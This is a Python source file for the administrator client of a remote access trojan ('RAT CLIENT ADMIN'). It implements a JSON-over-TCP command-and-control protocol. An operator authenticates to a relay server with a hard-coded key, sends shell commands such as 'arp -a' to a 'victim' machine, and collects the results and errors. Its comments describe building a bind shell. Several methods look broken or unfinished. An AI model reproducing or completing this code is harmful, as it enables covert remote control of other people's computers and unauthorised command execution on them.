# RAT CLIENT ADMIN
import socket    
import asyncio
from subprocess import run
from json import dumps,loads
from uuid import uuid4
import hmac

CODECS_FLE = {
    '0x00':{'HEADER':'0x00','CONTENT':'{result}','FLAG':'0x00'},
    '0x01':{'HEADER':'0x01','CONTENT':'{error}'},
    '0x02':{'HEADER':'0x02','CONTENT':'null'},
    '0x04':{'HEADER':'0x04','CONTENT':'null'},
    '0x06':{'HEADER':'0x06','CONTENT':None,'GUID':None},# comand
    '0x07':{'HEADER':'0x07','CONTENT':'{socket}'},
    '0x08':{'HEADER':'0x08','CONTENT':'{socket}'},
    '0x09':{'HEADER':'0x09','CONTENT':'null'},
    '0x10':{'HEADER':'0x10','IDN':'{IDN}'},
    '0x11':{'HEADER':'0x11','CONTENT':'{content}','FLAG':None},
    '0x15':{'HEADER':'0x15'},
    '0x16':{'HEADER':'0x16'},
    '0x17':{'HEADER':'0x17'}
    
}
class CGhiosProtocol(asyncio.Protocol):
    LOGGED = False
    def __init__(self,on_con_lost,stdout):
        self.stdout = stdout
        self.SUCCRESS = ''# vareable what saves the succres data of the peticions 
        self.ERRORS = ''# vareable what saves the errors data
        self.onChange = False
        self.IDN = '829HNDKMLSM09xmakcankancjkanc0iqwucbau'
        self.stringfyJSON = lambda dict: dumps(dict).encode('utf-8')
        self.loadJSON = lambda args: loads(args.decode('utf-8'))
        self.on_con_lost = on_con_lost
        self.ERRORS = {
            'null':{'HEADER':'0x01','CONTENT':'the command cannot be a null type !'},
            'command':{'HEADER':'0x01','CONTENT':'{content}','FLAG':'0x06'},
            'code':{'HEADER':'0x01','CONTENT':'code error woops! on: {content}','FLAG':'0xFF'}
        }
    def start_connection(self):
        pk = CODECS_FLE.get('0x04')
        pk['CONTENT'] = None
        self._transport.write(self.stringfyJSON(pk))
    def on_readyClient(self):
        ''' this function sends [CLIENT] -> [SERVER] - (PACKAGE WITH HEADER 0X09)
        this will complete the handshake with the server and client and it indicate what the client is ready for recive options
        this function can be used when the client execute some order or in the handshake 
        so it is a waiting signal !
        '''
        pk = CODECS_FLE.get('0x09')
        pk['CONTENT'] = None
        self._transport.write(self.stringfyJSON(pk))
    def endOfSession(self):
        self._transport.write(self.stringfyJSON(CODECS_FLE.get('0x02')))
    def sendError(self,key,content=None):
        if content:
            # if we needs to write some content error
            err = self.ERRORS.get(key)
            err['CONTENT'] = err['CONTENT'].format(content=content)
            # XXX: possible bug warning here!
            self._transport.write(self.stringfyJSON(err))
        else:
            self._transport.write(self.stringfyJSON(self.ERRORS.get(key)))
    def onSucress(self,content,flag):
        cc = CODECS_FLE.get('0x00')
        cc['CONTENT'] = content
        cc['FLAG'] = flag
        self._transport.write(self.stringfyJSON(cc))
        # sends the good news to the server
    def onLogin(self):
        ''' this function will try to login as a client admin in the server
        this can be used for change commands and communicate with the client
        like a p2p protocol but ussing only a single socket
        this is maked with the objective of make a bind shell and not create
        a server in the client side.
        
        
        ,IDN:str=self.IDN
        '''
        cc = CODECS_FLE.get('0x10')
        if self.IDN:
            cc['IDN'] = self.IDN
            #self.stdout(cc)
            self._transport.write(self.stringfyJSON(cc))
        else:
            raise NameError('IDN HASNNOT SETTED BAD USAGE OF METHOD!')
    def loginError(self,package:dict[str,str]):
        '''it throws a exeption if the error its an error login'''
        if package.get('HEADER') == '0x01' and package.get('FLAG') == '0x10':
            raise NameError('INCORRECT IDN ERROR !')
        if package.get('HEADER') == '0x01' and package.get('FLAG') == '0x12':
            raise NameError('TIME OUT ERROR ! \n RE LOG')
    def onSucressRequest(self,package:dict[str,str],callback,flag,*args,**kwargs):
        # this function will be used for merge a sucress content
        # if the flag is the sance of the content flag
        # then we will call the function
        
        if package.get('FLAG') == flag and package.get('HEADER') == '0x00':
            callback(*args,**kwargs)
    def onErrorRequest(self,package:dict[str,str],callback,flag,*args,**kwargs):
        if package.get('FLAG') == flag and package.get('HEADER') == '0x01':
            callback(*args,**kwargs) 
    def connection_made(self, transport):
        self._transport = transport
        #self.start_connection()
        # if we need to make some thing between sends the wait signal then here will add
        # function between()
        #self.on_readyClient()
    def sendCommand(self,command:str) ->dict[str,str]:
        ''' this function its a wrapper for send commands to the victim ''' 
        cc = CODECS_FLE['0x06']
        cc['CONTENT'] = command
        cc['GUID'] = uuid4().hex
        # for every command wi create new guid
        # this guid will be used for the victim client
        # it will compare the current guid and the old guid
        # if it its the sance guid the command will not be executed
        # in othercase the command will be executed
        return cc
        
        
        
        
    def writeInServer(self,content:dict[str,str],flag:str='0x22'):
        # wtite code in the server
        cc = CODECS_FLE.get('0x11')
        if flag:
            cc['FLAG'] = flag
        cc['CONTENT'] = content
        self._transport.write(self.stringfyJSON(cc))
    def restartSignalServer(self):
        self._transport.write(self.stringfyJSON())
    
    def _analyze_sucress(self,lds:dict[str,str|list[str]]):
        match lds.get('FLAG'):
            case '0x10':
                # the clients closes the connection we can
                # set a vareable True if the logging was sucressful
                CGhiosProtocol.LOGGED = True
                self.stdout(f'logged status: {CGhiosProtocol.LOGGED}')
                # then closes the connection
                self.eof_received()
                self._transport.close()
            case '0x11':
                
                self.stdout(lds.get('CONTENT'))
            case '0x06':
                self.onChange = True
                self.SUCCRESS = lds.get('CONTENT')
                self.stdout(lds.get('CONTENT'))
                # requests of succressful execution of commands
    def checkIfExecuteErrors(self,lds:dict[str,str]):
        if not(lds.get('CONTENT') == {}):
            self.onChange = True
            self.ERRORS = lds.get('CONTENT')
            self.stdout(f'execute comand error {lds.get("CONTENT")} in {lds.get("IP")} at  {lds.get("TIME")}')
        
    def _analyze_errors(self,lds:dict[str,str|list[str]]):
        match lds.get('FLAG'):
            case '0x13':
                raise NameError('UNLOGGED !')
            case '0x11':
                self.stdout('ERROR WRITING CONTENT ON THE SERVER !')
            case '0x06':
                self.onChange = True
                self.ERRORS = lds.get('CONTENT')
                # errors request
                self.checkIfExecuteErrors(lds)
      
    def analyzer_thram(self,lds:dict[str,str|list[str]]):
        match lds.get('HEADER'):
            case '0x06': self.sendCommand(package=lds)
            case '0x00': self._analyze_sucress(lds)
            case '0x01': self._analyze_errors(lds)
    def data_received(self, data):
        #self.analyser(data)
        #self.stdout('Data received: {!r}'.format(data.decode('utf-8')))
        lds = self.loadJSON(data)
        self.analyzer_thram(lds)
            
        #system(self.message)      
    def connection_lost(self, exc):
        #self.stdout('The server closed the connection')
        self.on_con_lost.set_result(True)
    def eof_received(self):
        self._transport.close()

class Client:
    def __init__(self,port,serverName=socket.gethostname()):
        self.serverName = serverName
        self.port = port
        self.command = ''
    async def _execute(self,lp:asyncio.AbstractEventLoop,on_con_lost:asyncio.AbstractEventLoop,serverName:str,port:int):
        '''
        dependiendo del metodo usado en el loop.create sera upd o tcp 
        
        '''
        pass
    async def _actions(self,transport:asyncio.BaseTransport, protocol:CGhiosProtocol,order:dict[str,str]):
        ''' 
        in this case the order argument will contain the action what the admin client
        wanna sent to the server
        ''' 
        header = order.get('HEADER')
        self.onChange = protocol.onChange
        #print(header)
        match header:
            case '0x04':
                protocol.start_connection()
                protocol.eof_received()
            case '0x10':
                protocol.onLogin()
                
                # server sends if logging was succressful
                
                #protocol.eof_received()
            case '0x11':
                protocol.writeInServer(content=protocol.sendCommand(command=self.command))
            case '0x15':
                transport.write(protocol.stringfyJSON(CODECS_FLE.get('0x15')))
            case '0x16':
                transport.write(protocol.stringfyJSON(CODECS_FLE.get('0x16')))
            case '0x17':
                transport.write(protocol.stringfyJSON(CODECS_FLE.get('0x17')))
                # restart signal
            case _:
                self.stdout(header)
                # server closes the connection
        #protocol.eof_received()
    async def main_loop(self,command):
        lp = asyncio.get_running_loop()
        on_con_lost = lp.create_future()
        
        t,p = await self._execute(lp=lp,on_con_lost=on_con_lost,serverName=self.serverName,port=self.port)
        await self._actions(transport=t, protocol=p,order=command)
        #t.close()
        try:
            await on_con_lost
        finally:
            t.close()
    async def startAuth(self):
        await self.main_loop(command=CODECS_FLE.get('0x04'))# start
        await self.main_loop(command=CODECS_FLE.get('0x10'))# login
        #await self.main_loop(command=CODECS_FLE.get('0x11'))# write
        #await self.main_loop(command=CODECS_FLE.get('0x15'))# request errors
        #await self.main_loop(command=CODECS_FLE.get('0x16'))# request succress
    
    def run(self):
        #asyncio.r
        asyncio.run(self.startAuth())
        
class TCP_MASTER(Client):
    def __init__(self, port):
        #self.idn ='xmsalxaca8cac3cac9vr8gvr2br9bbn2n'
        #CODECS_FLE.get('0x10')['IDN'] = self.idn
        super().__init__(port)
        self.codec = {}
        self.stdout = print# funcion de impresion de datos
        self._rapidAcitions = {
            'auth':self._Auth,
            'errors':self._checkErrors    
        }# if some flag is inside them then execute this subrutine 
        self._rkeys = self._rapidAcitions.keys()
        
    async def _Auth(self):
        await super().startAuth()
        # execute the old auth form
    async def _checkErrors(self):
        # get succressful
        await self.main_loop(command=CODECS_FLE.get('0x16'))
        await self.main_loop(command=CODECS_FLE.get('0x15'))
        #self.run()
        #self.codec = CODECS_FLE.get('0x15')
        #self.run()
        # get errors
    @property
    def setCommandExec(self):
        return super().command
    @setCommandExec.setter
    def setCommandExec(self,arg):
        super().command = arg
    async def startAuth(self):
        # start handshake an logging 
        #await self.main_loop(command=CODECS_FLE.get('0x04'))# start
        #await self.main_loop(command=CODECS_FLE.get('0x10'))# login
        if isinstance(self.codec,str) and self.codec in self._rkeys:
            return await self._rapidAcitions.get(self.codec)()
        await self.main_loop(command=self.codec)
        # super().startAuth()
    async def _execute(self,lp:asyncio.AbstractEventLoop,on_con_lost:asyncio.AbstractEventLoop,serverName:str,port:int):
        
        return await lp.create_connection(lambda : CGhiosProtocol(stdout=self.stdout,on_con_lost=on_con_lost),host=serverName,port=port)

if __name__ == '__main__':
    #self.stdout('starting connection !')
    master = TCP_MASTER(7777)
    master.codec = 'auth'#master._rapidAcitions.get('auth')
    #authenticate
    master.run()
    master.codec = CODECS_FLE.get('0x11')
    master.command = 'arp -a'
    master.run()
    # writes dir into the server
    master.codec = 'errors'
    master.run()
    # executes the command
    